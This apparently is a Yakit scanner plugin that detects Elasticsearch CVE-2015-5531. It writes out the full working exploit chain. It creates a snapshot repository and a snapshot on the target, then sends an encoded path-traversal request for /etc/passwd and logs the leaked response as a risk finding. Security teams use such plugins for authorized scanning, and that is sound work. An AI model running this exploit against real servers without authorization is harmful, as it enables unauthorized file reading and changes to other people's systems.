# port scan plugin
yakit.AutoInitYakit()

createStore = func(target,port,sname){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `PUT /_snapshot/{{params(sname)}} HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/{{params(sname)}}" 
    }
}
`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"sname":sname,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfSubString(rsp,`{"acknowledged":true}`){
            yakit.Info("%v 创建仓库成功", addr)
            return true
        }
        
    }

    return
}

createSnapshot = func(target,port,sname){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `PUT /_snapshot/test2 HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/{{params(sname)}}/snapshot-backdata" 
    }
}

`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"sname":sname,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfSubString(rsp,`{"acknowledged":true}`){
            yakit.Info("%v 创建快照成功", addr)
            return true
        }
       
    }

    return
}



handleCheck = func(target,port,sname){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET /_snapshot/{{params(sname)}}/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0


`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"sname":sname,}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        
        if str.MatchAllOfRegexp(rsp,`Failed to derive xcontent from \(offset=\d+, length=\d+\)\: \[`){
            yakit.Info("%v found Elasticsearch <1.6.1 CVE-2015-5531 目录遍历与文件读取漏洞 ", addr)
            risk.NewRisk(
            addr,risk.title("CVE-2015-5531"),
            risk.severity("low"),
            risk.titleVerbose("Elasticsearch <1.6.1 CVE-2015-5531 目录遍历与文件读取漏洞"),
            risk.type("leakinfo[Elasticsearch]"),
            risk.payload(str.f(`/_snapshot/%s/backdata%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2f..%%2fetc%%2fpasswd`,sname)),
            risk.details({
                "target":addr,
                "request":req,
                "response":rsp,
            }),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    
    if len(result.Fingerprint.HttpFlows)>0{
        sname = randstr(5)
        if str.MatchAllOfSubString(string(result.Fingerprint.CPEs),"elasticsearch"){
            if createStore(result.Target,result.Port,sname){
                if createSnapshot(result.Target,result.Port,sname){
                    handleCheck(result.Target,result.Port,sname)
                }
            }
        }
    }
    
}
